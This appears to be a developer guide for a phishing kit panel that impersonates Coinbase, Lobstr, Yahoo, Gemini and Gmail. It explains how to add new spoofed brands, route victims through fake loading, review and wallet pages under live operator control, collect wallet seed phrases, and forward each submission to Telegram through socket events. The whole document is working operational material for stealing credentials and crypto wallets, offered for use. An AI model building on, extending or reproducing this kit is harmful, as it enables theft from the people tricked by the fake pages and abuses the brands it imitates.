# AIO Panel - Brand Management Guide

## Overview
This panel supports multiple brands (Coinbase, Lobstr, Yahoo, Gemini, Gmail) with brand-specific pages and routing. Each brand has its own loading page and can have custom pages for different flows.

## Current Brand Structure

### Existing Brands and Their Pages:
1. **Coinbase** (default)
   - loading.html
   - Review.html
   - EstimatedBalance.html
   - WhitelistWallet.html
   - DisconnectWallet.html
   - (and more standard pages)

2. **Lobstr**
   - lobstrloading.html
   - lobstrreview.html
   - lobstrestimatedbalance.html
   - lobstrwhitelistwallet.html
   - lobstrdisconnectwallet.html

3. **Yahoo**
   - yahooloading.html

4. **Gemini**
   - geminiloading.html

5. **Gmail**
   - gmailloading.html

## Adding a New Brand

### Step 1: Create Brand Pages
Create HTML files in `E:\AIO Panel\test-main\TERRIBLE\public\pages\` following the naming convention:
- `[brandname]loading.html` (required - default landing page)
- `[brandname]review.html` (optional)
- `[brandname]estimatedbalance.html` (optional)
- Add any other brand-specific pages as needed

### Step 2: Update sessionList.jsx
Location: `E:\AIO Panel\test-main\TERRIBLE\src\admin\components\sessionList.jsx`

1. Add the brand to the dropdown:
```javascript
<select value={selectedBrand} onChange={(e) => setSelectedBrand(e.target.value)}>
    <option value="Coinbase">Coinbase</option>
    <option value="Lobstr">Lobstr</option>
    <option value="Yahoo">Yahoo</option>
    <option value="Gemini">Gemini</option>
    <option value="Gmail">Gmail</option>
    <option value="NewBrand">NewBrand</option> // Add your new brand here
</select>
```

2. Update the getDefaultPage function:
```javascript
const getDefaultPage = (brand) => {
    switch(brand) {
        case 'Lobstr': return 'lobstrloading.html';
        case 'Yahoo': return 'yahooloading.html';
        case 'Gemini': return 'geminiloading.html';
        case 'Gmail': return 'gmailloading.html';
        case 'NewBrand': return 'newbrandloading.html'; // Add your new brand here
        default: return 'loading.html';
    }
};
```

3. If brand has custom pages, update getBrandSpecificPages:
```javascript
const getBrandSpecificPages = (brand) => {
    if (brand === 'Lobstr') {
        return ['lobstrloading.html', 'lobstrreview.html', 'lobstrestimatedbalance.html', 
                'lobstrwhitelistwallet.html', 'lobstrdisconnectwallet.html'];
    } else if (brand === 'NewBrand') {
        return ['newbrandloading.html', 'newbrandreview.html']; // Add brand-specific pages
    }
    // Return standard pages for other brands
    return [...];
};
```

### Step 3: Update Server Configuration
Location: `E:\AIO Panel\test-main\TERRIBLE\src\server\index.js`

Update the getBrandDomain function:
```javascript
function getBrandDomain(brand) {
    switch(brand) {
        case 'Lobstr': return 'lobstr.co';
        case 'Yahoo': return 'yahoo.com';
        case 'Gemini': return 'gemini.com';
        case 'Gmail': return 'gmail.com';
        case 'NewBrand': return 'newbrand.com'; // Add your new brand domain
        default: return 'www.coinbase.com';
    }
}
```

### Step 4: Page Template Structure

All brand pages should include:

1. **Socket.io Connection** (for real-time updates):
```html
<script src="/socket.io/socket.io.js"></script>
<script src="/js/socket-client.js"></script>
```

2. **User Action Notifications** (for Telegram alerts):
```javascript
socket.emit('user_action', {
    type: 'action_type', // e.g., 'seed_phrase_submitted', 'wallet_connected'
    data: relevantData,
    page: 'currentPageName',
    timestamp: new Date().toISOString()
});
```

3. **Page Redirects**:
```javascript
socket.emit('request_redirect', { page: 'targetpage' });
```

## Important Files and Locations

### Frontend Components:
- **Admin Panel**: `src/admin/components/sessionList.jsx`
- **Brand Pages**: `public/pages/[brandname]*.html`
- **Socket Client**: `public/js/socket-client.js`

### Backend Components:
- **Main Server**: `src/server/index.js`
- **HTML Transformer**: `src/server/utils/BackgroundHTMLTransformer.js`
- **Socket Handler**: `src/server/socketHandler.js`

### Special Pages:
- **Captcha Page**: `public/pages/captcha.html` (dynamically shows brand domain)
- **Loading Pages**: Each brand's default landing page

## Common Patterns

### 1. Seed Phrase Collection:
```javascript
// Validate seed phrase (12 or 24 words)
const words = phrase.trim().split(/\s+/);
if (words.length !== 12 && words.length !== 24) {
    // Show error
}

// Send to server
socket.emit('user_action', {
    type: 'seed_phrase_submitted',
    data: seedPhrase,
    page: 'pageIdentifier',
    timestamp: new Date().toISOString()
});
```

### 2. Brand-Specific Redirects:
```javascript
// Redirect to brand-specific loading page
const loadingPage = selectedBrand === 'Lobstr' ? 'lobstrloading' : 
                    selectedBrand === 'Yahoo' ? 'yahooloading' :
                    selectedBrand === 'Gemini' ? 'geminiloading' :
                    selectedBrand === 'Gmail' ? 'gmailloading' : 'loading';
socket.emit('request_redirect', { page: loadingPage });
```

### 3. Dynamic Content Based on Brand:
The captcha page and BackgroundHTMLTransformer automatically use the selected brand's domain. No manual updates needed for these.

## Testing New Brands

1. Start the server: `npm run dev` in the TERRIBLE directory
2. Access admin panel at `http://localhost:3000/admin`
3. Select the new brand from dropdown
4. Test page redirects and socket connections
5. Verify Telegram notifications are received
6. Check that captcha shows correct domain

## Troubleshooting

### Common Issues:
1. **Page not loading**: Check file exists in `public/pages/` with correct naming
2. **Redirects not working**: Verify page name in redirect matches exactly (case-sensitive)
3. **Socket not connecting**: Ensure socket.io scripts are included in HTML
4. **Telegram notifications not sent**: Check 'user_action' event format
5. **Wrong domain in captcha**: Update getBrandDomain function in server

### Debug Commands:
- Check available pages: Look in `public/pages/` directory
- View socket events: Check browser console Network tab for WebSocket
- Server logs: Check terminal running the server for errors

## Quick Reference

### Add a Simple Brand (loading page only):
1. Create `[brand]loading.html` in `public/pages/`
2. Add brand to dropdown in `sessionList.jsx`
3. Update `getDefaultPage()` in `sessionList.jsx`
4. Update `getBrandDomain()` in `index.js`

### Add Complex Brand (multiple pages):
1. Create all brand pages in `public/pages/`
2. Follow simple brand steps above
3. Update `getBrandSpecificPages()` in `sessionList.jsx`
4. Ensure all pages have socket.io and proper event emitters

### Essential Socket Events:
- `user_action`: Sends notifications to Telegram
- `request_redirect`: Changes displayed page
- `page_loading`: Shows loading state
- `update_session`: Updates session data

## Notes
- All page names are case-sensitive
- Brand selection persists in localStorage
- Default landing page auto-updates when brand changes
- Captcha domain updates automatically based on selected brand
- Socket connections required for all interactive pages